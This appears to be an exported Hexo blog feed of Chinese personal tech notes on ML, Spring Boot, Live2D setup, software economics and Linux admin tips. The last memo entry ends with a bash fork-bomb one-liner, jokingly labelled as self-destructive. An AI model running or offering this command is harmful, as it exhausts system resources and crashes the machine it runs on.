class="line">输出层：向网络外部输出数据的顶点</span><br></pre></td></tr></table></figure><ul><li>超参数有哪些</li><li>如何衡量你的预测算法，损失函数loss</li><li>感知机是啥</li><li>BP是啥 RBF是啥 hopfield是啥 SOM是啥</li><li>计算隐藏层结点数目</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">隐层结点数s与模式数N的关系是：s＝log2N；</span><br><span class="line">隐层结点数s＝2n＋1（n为输入层结点数）；</span><br></pre></td></tr></table></figure><ul><li>CNN</li><li>LSTM</li><li>聚类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">1.原理简单，实现方便，收敛速度快；</span><br><span class="line">2.聚类效果较优；</span><br><span class="line">3.模型的可解释性较强；</span><br><span class="line">4.调参只需要簇数k；</span><br><span class="line">缺点：</span><br><span class="line">1.k的选取不好把握；</span><br><span class="line">2.初始聚类中心的选择；</span><br><span class="line">3.如果数据的类型不平衡，比如数据量严重失衡或者类别的方差不同，则聚类效果不佳；</span><br><span class="line">4.采用的是迭代的方法，只能得到局部最优解；</span><br><span class="line">5.对于噪声和异常点比较敏感。</span><br></pre></td></tr></table></figure><ul><li>聚类性能度量 外部指标 内部指标</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外：聚类结果与某个“参考模型”(reference model) 进行比较，需要标记数据如Jaccard 系数，FM 指数，Rand 指数</span><br><span class="line">内：直接考察聚类结果而不用任何参考模型，类内聚集程度和类间离散程度。定义簇内样本间的距离，簇间距离，如DB 指数，Dunn 指数等</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>这学期项目中的坑</title>
      <link href="/2019/06/12/2019-06-12-%E9%A1%B9%E7%9B%AE%E5%9D%91/"/>
      <url>/2019/06/12/2019-06-12-%E9%A1%B9%E7%9B%AE%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>佛了</p><a id="more"></a><h2 id="mysql分离-springboot-eurake"><a href="#mysql分离-springboot-eurake" class="headerlink" title="mysql分离 + springboot + eurake"></a>mysql分离 + springboot + eurake</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原因是 配置远程数据库时，springboot 没有创建表，自己手动建了hibernate sequence后就会报这个错。</span><br><span class="line">表现为插入数据失败，error &quot;could not read a hi value - you need to populate the table&quot;.</span><br><span class="line"></span><br><span class="line">解决方法是对nextval设置初始值，stackoverflow的另一种方案是</span><br><span class="line">改掉注释</span><br><span class="line">@GeneratedValue(strategy = GenerationType.AUTO)改为@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jekyll加入live2d的模型</title>
      <link href="/2019/05/14/2019-05-14-jekyll%E5%8A%A0%E5%85%A5live2d%E6%A8%A1%E5%9E%8B/"/>
      <url>/2019/05/14/2019-05-14-jekyll%E5%8A%A0%E5%85%A5live2d%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p><del>由于不打算再迁到hexo了，把jekyll加入live2d模型的方法记录一下</del><br>2019-8-1: 迁hexo了。</p><a id="more"></a><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>npm install hexo-cli</p><p>使用hexo初始化一个本地的博客文件夹 hexo init</p><p>安装需要的依赖 npm install就可以了</p><h3 id="在hexo安装live2d插件"><a href="#在hexo安装live2d插件" class="headerlink" title="在hexo安装live2d插件"></a>在hexo安装live2d插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br></pre></td></tr></table></figure><ul><li>详见 <a href="https://github.com/EYHN/hexo-helper-live2d" target="_blank" rel="noopener">hexo-helper-live2d</a></li></ul><h3 id="在hexo配置一下"><a href="#在hexo配置一下" class="headerlink" title="在hexo配置一下"></a>在hexo配置一下</h3><p>在config里面加入live2d的配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hexo-helper-live2d项目给的配置文件例子</span><br><span class="line">live2d:</span><br><span class="line">  model:</span><br><span class="line">    scale: 1</span><br><span class="line">    hHeadPos: 0.5</span><br><span class="line">    vHeadPos: 0.618</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">    position: right</span><br><span class="line">    hOffset: 0</span><br><span class="line">    vOffset: -20</span><br><span class="line">  mobile:</span><br><span class="line">    show: true</span><br><span class="line">    scale: 0.5</span><br><span class="line">  react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><p>找你要加入的live2d模型（有钱的可以去订做，把widget替换掉。</p><p><strong>koharu在这里面<a href="https://github.com/xiazeyu/live2d-widget-models" target="_blank" rel="noopener">live2d-widget-model</a></strong></p><p>clone所需要的live2d模型后，还需要在config里面加入一个live2d配置。</p><p>配置文件如下<del>（注释是wife还行）</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#wife</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: koharu  #模板目录，在node_modules里</span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: false</span><br></pre></td></tr></table></figure><h3 id="启动hexo，会自动编译生成可用的模型文件"><a href="#启动hexo，会自动编译生成可用的模型文件" class="headerlink" title="启动hexo，会自动编译生成可用的模型文件"></a>启动hexo，会自动编译生成可用的模型文件</h3><p>目的文件live2d文件夹，编译后的文件目录如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_config.yml  live2d_models  package.json  scaffolds  themes</span><br><span class="line">db.json      node_modules   public        <span class="built_in">source</span></span><br></pre></td></tr></table></figure><h3 id="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"><a href="#在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了" class="headerlink" title="在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了"></a>在index中找一个js标签，加入到jekyll的需要加的layout文件中就可以直接用了</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;L2Dwidget.init(&#123;<span class="string">"pluginModelPath"</span>:<span class="string">"assets/"</span>,<span class="string">"model"</span>:&#123;<span class="string">"jsonPath"</span>:<span class="string">"/live2dw/assets/koharu.model.json"</span>&#125;,<span class="string">"display"</span>:&#123;<span class="string">"position"</span>:<span class="string">"right"</span>,<span class="string">"width"</span>:<span class="number">150</span>,<span class="string">"height"</span>:<span class="number">300</span>&#125;,<span class="string">"mobile"</span>:&#123;<span class="string">"show"</span>:<span class="literal">false</span>&#125;,<span class="string">"log"</span>:<span class="literal">false</span>,<span class="string">"pluginJsPath"</span>:<span class="string">"lib/"</span>,<span class="string">"pluginRootPath"</span>:<span class="string">"live2dw/"</span>,<span class="string">"tagMode"</span>:<span class="literal">false</span>&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> live2d </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件工程经济学</title>
      <link href="/2019/05/04/2019-05-04-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/"/>
      <url>/2019/05/04/2019-05-04-%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B%E7%BB%8F%E6%B5%8E%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p>from 华南理工大学 左保和老师<br>软件项目如何进行融资、分析风险、敏感性因素等</p><a id="more"></a><h2 id="软件工程经济学基础"><a href="#软件工程经济学基础" class="headerlink" title="软件工程经济学基础"></a>软件工程经济学基础</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">requirement</span><br><span class="line">design</span><br><span class="line">constructure 详细设计和总体设计在design完成，</span><br><span class="line">testing</span><br><span class="line">maintenance</span><br><span class="line">configure management，软件团队的管理办法</span><br><span class="line">management </span><br><span class="line">tools and method</span><br><span class="line">engineering process</span><br><span class="line">quality</span><br></pre></td></tr></table></figure><h3 id="货币的时间成本，举例说明这个概念的重要性"><a href="#货币的时间成本，举例说明这个概念的重要性" class="headerlink" title="货币的时间成本，举例说明这个概念的重要性"></a>货币的时间成本，举例说明这个概念的重要性</h3><p>1、货币时间成本<br>按利率衡量<br>特定时间内 ，利息/借贷资本</p><ul><li>利息计算方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单利 I = iP N ==&gt; 利率*存款*计息周期数</span><br><span class="line">复利 F = P（1+i）^N</span><br></pre></td></tr></table></figure></li></ul><h3 id="掌握的重要概念part1"><a href="#掌握的重要概念part1" class="headerlink" title="掌握的重要概念part1"></a>掌握的重要概念part1</h3><p>利率、利息额、借贷资本总额<br>通货膨胀率、消费者价格指数（CPI）、生产者价格指数（PPI）<br>利息的计算方法：单利、复利、计息期（一般为年，或换算为年）<br>等值计算的概念和意义（现值、折现率）<br>等额支付（等额本金、等额本息）<br>税收、营业税、增值税、营改增<br>贬值、折旧</p><h4 id="工程经济学的概念"><a href="#工程经济学的概念" class="headerlink" title="工程经济学的概念"></a>工程经济学的概念</h4><p>工程经济学是运用有效的方法对工程各种因素进行评价，确定最佳方案，做出投资决策的学科，的研究对象是工程项目。<br>对软件工程领域来说，</p><h4 id="金融学"><a href="#金融学" class="headerlink" title="金融学"></a>金融学</h4><p>明确目标周期机构<br>商业战略 管理现今流量管理</p><h4 id="会计学原理资产"><a href="#会计学原理资产" class="headerlink" title="会计学原理资产"></a>会计学原理资产</h4><p>对外投资<br>固定资产<br>货币资金<br>收入费用利润</p><h4 id="现金流量"><a href="#现金流量" class="headerlink" title="现金流量"></a>现金流量</h4><p>现金的定义</p><ul><li>指企业的库存现金和银行存款，还包括现金等价物，即企业持有的期限短、流动性强、容易转换为已知金额现金、价值变动风险很小的投资等</li><li>一项投资被确认为现金等价物必须同时具备四个条件：期限短、流动性强、易于转换为已知金额现金、价值改动风险小。</li><li>是企业财力的评价指标之一</li></ul><h4 id="现金流量图"><a href="#现金流量图" class="headerlink" title="现金流量图"></a>现金流量图</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">现金流入流出</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|_________________</span><br><span class="line">|                 时间,指财务周期</span><br><span class="line">|</span><br><span class="line">|</span><br><span class="line">|</span><br></pre></td></tr></table></figure><h4 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h4><p>等额支付</p><p>线性梯度支付<br>p=G{}<br>几何梯度支付<br>第二年 = 第一年* (1+G)</p><h4 id="通货膨胀"><a href="#通货膨胀" class="headerlink" title="通货膨胀"></a>通货膨胀</h4><p>纸币的发行量超过了流通中实际需要的数量，多余的部分继续在流通中流转，就会造成通货膨胀（百度百科）</p><h4 id="折现"><a href="#折现" class="headerlink" title="折现"></a>折现</h4><p>衡量现金流量，税收，</p><h4 id="税收"><a href="#税收" class="headerlink" title="税收"></a>税收</h4><p>营业 教育 增值</p><h3 id="基准收益率与利率的区别"><a href="#基准收益率与利率的区别" class="headerlink" title="基准收益率与利率的区别"></a>基准收益率与利率的区别</h3><p>基准收益率也被称为基准折现率。<br>区别1：和利率不同，利率是资金利息额与借贷资金额的比率；收益率是投资的回报率，利润占使用平均资金的百分比。<br>区别2：基准收益率是企业或行业或投资者以动态的观点所确定的、可接受的投资项目最低标准的受益水平，由国家发改委和建设部制定。<br>基准利率由中国人民银行制定。<br>区别3：上节讲的通货膨胀、利息等宏观因素是影响利率的主要因素；<br>而对收益率来说，商品的生产率、运维生产率，投资，不确定度、消费者的消费偏好、投资风险、物价变动等因素是主要因素，并且根据每个行业的行情变动相对利率较大。<br>软件行业的基准收益率是15%。</p><ul><li>发改委官网、国家统计局官网上找不到数据，在材料《建设项目经济评价方法与参数》上有对各行业经济的各项参数的详细介绍</li><li>部分数据参照“北京软件造价评估技术创新联盟”网站的报告，包括2016-2018年，<a href="http://www.bscea.org/Uploads/ueditor/file/20181012/5bc00c9f71b20.pdf" target="_blank" rel="noopener">2018中国软件行业基准数据报告</a></li></ul><h3 id="cpi-，-spi"><a href="#cpi-，-spi" class="headerlink" title="cpi ， spi"></a>cpi ， spi</h3><p>CPI=EV/AC，SPI=EV/PV</p><p>cpi 成本绩效指标<br>甘特图 贬值进度计划<br>进度控制指标<br>spi &lt;1  进度落后  =1 按计划进行  &gt;1 超前进行<br>开发者效率</p><h3 id="软件项目质量"><a href="#软件项目质量" class="headerlink" title="软件项目质量"></a>软件项目质量</h3><p>ISO度量</p><h3 id="软件质量保证"><a href="#软件质量保证" class="headerlink" title="软件质量保证"></a>软件质量保证</h3><p>制定推行软件工程质量标准<br>研究 采用各种技术手段<br>控制各种变更<br>制定并执行测试计划<br>按质量标准对软件质量进行度量<br>组织各种技术评审会</p>]]></content>
      
      
      <categories>
          
          <category> 软件工程经济学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>备忘的一些操作</title>
      <link href="/2019/04/17/2019-04-17-%E5%A4%87%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9B%E7%83%A6%E4%BA%BA%E6%93%8D%E4%BD%9C/"/>
      <url>/2019/04/17/2019-04-17-%E5%A4%87%E5%BF%98%E7%9A%84%E4%B8%80%E4%BA%9B%E7%83%A6%E4%BA%BA%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>包括用linux自带openssl签postfix证书、流媒体证书按网上教程（找不到之类的问题，最后自己把证书试出来了，见第一部分，还有博客cdn换成tx云因为配置不一样导致好久没发现cdn没启用等尴尬的问题</p><a id="more"></a><h2 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h2><p>ubuntu自带的openssl包含的证书和RSA密钥等，相当于一套封装的加密套件。</p><ul><li>based on SSL&amp;TLS</li><li>生成常用key的指令如下（很久远了，之前记下的只有几个，以后更新）</li><li>如果没有的话可以下载包ca-certificates</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public:</span><br><span class="line">openssl rsa -in rsa_private.key -pubout -out rsa_public.key</span><br><span class="line"></span><br><span class="line">private ase256加密:</span><br><span class="line">openssl genrsa -aes256 -passout pass:111111 -out rsa_aes_private.key 2048</span><br><span class="line"></span><br><span class="line">签postfix实现加密，关键的两步:</span><br><span class="line">由于Thawte_Premium_Server_CA.pem证书失效，在新的cacert包里面更换成thawte_Primary_Root_CA.pem</span><br><span class="line">cat /etc/ssl/certs/thawte_Primary_Root_CA.pem | sudo tee -a /etc/postfix/cacert.pem</span><br><span class="line">修改main.cf的smtp_tls_CAfile = /etc/postfix/cacert.pem，</span><br><span class="line">使用postmap生成用户名和密码的hash表</span><br><span class="line">重新加载/etc/init.d/postfix（postfix服务的jio本）就可以使用了</span><br></pre></td></tr></table></figure><h2 id="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"><a href="#怪事情，opencv的cvtColor突然不能用，但是服务器上没问题" class="headerlink" title="怪事情，opencv的cvtColor突然不能用，但是服务器上没问题"></a>怪事情，opencv的cvtColor突然不能用，但是服务器上没问题</h2><ul><li>解决方法找了其他源。。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda install --channel https://conda.anaconda.org/menpo opencv3</span><br></pre></td></tr></table></figure></li></ul><h2 id="shell以前记的笔记"><a href="#shell以前记的笔记" class="headerlink" title="shell以前记的笔记(_ _)"></a>shell以前记的笔记(_ _)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开头加一句#!/bin/bash 说明是一个脚本</span><br><span class="line">变量不需要声明可以直接用</span><br><span class="line">变量取值的话加美元</span><br><span class="line">If while中条件注意空格</span><br><span class="line">变量赋值不加空格</span><br><span class="line">Echo重定向：如果需要变量值和字符串相连，加大括号。</span><br><span class="line">没写i自增导致死循环</span><br><span class="line">If后一定要写fi代表结束，汇编格式吼啊</span><br></pre></td></tr></table></figure><ul><li>一个技巧，似乎是以前在用别人写的caffe库的时候出现了这个问题，忘了报什么错了，不是记得很清楚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    在Linux下编程时，或者说在一个有很多头文件互相 include 的场景中，经常会遇到不清楚一个变量</span><br><span class="line">的完整类型定义的情况（因为有用 <span class="keyword">typedef</span> 封装），从而有可能遇到编译出错。</span><br><span class="line">    例如在使用 stat 来读取文件属性的 i-node number 时，查看 stat 的手册，得知这个变量 st_ino 的变量类型是 <span class="keyword">ino_t</span>，而我们不清楚 <span class="keyword">ino_t</span>的准确定义究竟是什么。</span><br><span class="line">可以用如下方法：声明一个这样的变量即可。</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">ino_t</span> blah;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">然后运行如下指令：</span><br><span class="line"></span><br><span class="line">gcc -E test.c | grep <span class="keyword">ino_t</span></span><br><span class="line">-E 选项的意思是：在预处理过程后结束并输出到标准输出。</span><br><span class="line">文档原文如下</span><br><span class="line">-E Stop after the preprocessing stage; <span class="keyword">do</span> <span class="keyword">not</span> run the compiler proper. </span><br><span class="line">The output is in the form of preprocessed source code, which is sent to the standard output.</span><br></pre></td></tr></table></figure><ul><li>c文件生成的步骤</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C/C++文件经过预处理(preprocessing)、编译(compilation)、汇编(assembly)、和连接(linking)才能变成可执行文件。</span><br></pre></td></tr></table></figure><ul><li>查看已经建立的tcp链接数量，包括close_waite ,established,time_wait状态，</li><li>不会awk的时候感觉这是个什么东西orz</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -n | awk &apos;/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&apos;</span><br></pre></td></tr></table></figure><h2 id="安装lua的时候-readline缺失"><a href="#安装lua的时候-readline缺失" class="headerlink" title="安装lua的时候 readline缺失"></a>安装lua的时候 readline缺失</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">安装一下 libreadline-dev，或者readline-dev，版本不一样有哪个装哪个</span><br></pre></td></tr></table></figure><h2 id="树莓派摄像头（非dsi口）"><a href="#树莓派摄像头（非dsi口）" class="headerlink" title="树莓派摄像头（非dsi口）"></a>树莓派摄像头（非dsi口）</h2><ul><li><p>可以这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mplayer -tv driver=v4l2:width=800:height=700:device=/dev/video1 tv://</span><br></pre></td></tr></table></figure></li><li><p>python调用的时候使用PiCamera库或者cv库，PiCamera可以测试下能不能用，毕竟两行代码，做视觉还是用cv了</p><h2 id="tx云cdn"><a href="#tx云cdn" class="headerlink" title="tx云cdn"></a>tx云cdn</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置cdn</span><br><span class="line">源站信息： 自有源站，waynamigo.github.io</span><br><span class="line">回源配置： 回源host，waynamigo.cn</span><br></pre></td></tr></table></figure></li></ul><h3 id="发现使用shadowsocks还行，那个ssr扔了"><a href="#发现使用shadowsocks还行，那个ssr扔了" class="headerlink" title="发现使用shadowsocks还行，那个ssr扔了"></a>发现使用shadowsocks还行，那个ssr扔了</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sslocal -c /etc/shadowsocks/config.json -d start</span><br></pre></td></tr></table></figure><p>sslocal 直接用apt安装shadowsocks</p><h3 id="使用的"><a href="#使用的" class="headerlink" title="使用的"></a>使用的</h3><h3 id="流媒体搭建"><a href="#流媒体搭建" class="headerlink" title="流媒体搭建"></a>流媒体搭建</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/arut/nginx-rtmp-module.git</span><br><span class="line"></span><br><span class="line">wget http://nginx.org/download/nginx-1.8.1.tar.gz </span><br><span class="line">tar -zxvf nginx-1.8.1.tar.gz </span><br><span class="line">cd nginx-1.8.1 </span><br><span class="line">先安装一下依赖</span><br><span class="line">yum install pcre-devel</span><br><span class="line">yum install zlib zlib-devel</span><br><span class="line">yum install openssl openssl-devel</span><br><span class="line"></span><br><span class="line">./configure --prefix=/usr/local/nginx  --add-module=../nginx-rtmp-module  --with-http_ssl_module   </span><br><span class="line">make </span><br><span class="line">make install</span><br></pre></td></tr></table></figure><ul><li>/usr/local/nginx/conf/nginx.conf</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rtmp &#123;   </span><br><span class="line">     </span><br><span class="line">    server &#123;   </span><br><span class="line">     </span><br><span class="line">        listen 1935;  #监听的端口 </span><br><span class="line">     </span><br><span class="line">        chunk_size 4000;   </span><br><span class="line">           </span><br><span class="line">            </span><br><span class="line">        application hls &#123;  #rtmp推流请求路径 </span><br><span class="line">            live on;   </span><br><span class="line">            hls on;   </span><br><span class="line">            hls_path /usr/share/nginx/html/hls;   </span><br><span class="line">            hls_fragment 5s;   </span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125; </span><br><span class="line">修改server模块的</span><br><span class="line">location / &#123; </span><br><span class="line">        root   /usr/share/nginx/html; </span><br><span class="line">        index  index.html index.htm; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="git配置多用户"><a href="#git配置多用户" class="headerlink" title="git配置多用户"></a>git配置多用户</h3><p>.ssh/config</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName github.com</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_qq</span><br><span class="line">    User nanamya</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd  .git</span><br><span class="line">设置本项目的用户名和邮箱</span><br><span class="line">git config user.name <span class="string">"yourname"</span></span><br><span class="line">git config user.email <span class="string">"youremail"</span></span><br><span class="line">如果重设 则：</span><br><span class="line">git config --global --unset user.name</span><br><span class="line">git config --global --unset user.email</span><br></pre></td></tr></table></figure><p>如果还是8行，检查一下，正常的话会有如下提示，否则会有debug的信息<br>ssh -vT <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p><ul><li>提示Hi waynamigo! You’ve successfully authenticated, but GitHub does not provide shell access.</li></ul><p>更换用户</p><h3 id="作死小能手"><a href="#作死小能手" class="headerlink" title="作死小能手"></a>作死小能手</h3><ul><li>:() { function :|:&amp; }; :</li></ul>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NeuralRecon for 3D reconstruction in real-time</title>
      <link href="/2019/04/01/2019-04-01-%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E7%AE%97%E6%B3%95%E6%8C%87%E6%A0%87%E7%9A%84%E8%AE%A1%E7%AE%97/"/>
      <url>/2019/04/01/2019-04-01-%E8%AF%84%E4%BC%B0%E6%A8%A1%E5%9E%8B%E7%AE%97%E6%B3%95%E6%8C%87%E6%A0%87%E7%9A%84%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> DL </tag>
            
            <tag> Object Detection </tag>
            
            <tag> Segmentation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker笔记整理（二）</title>
      <link href="/2019/03/27/2019-03-27-docker%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
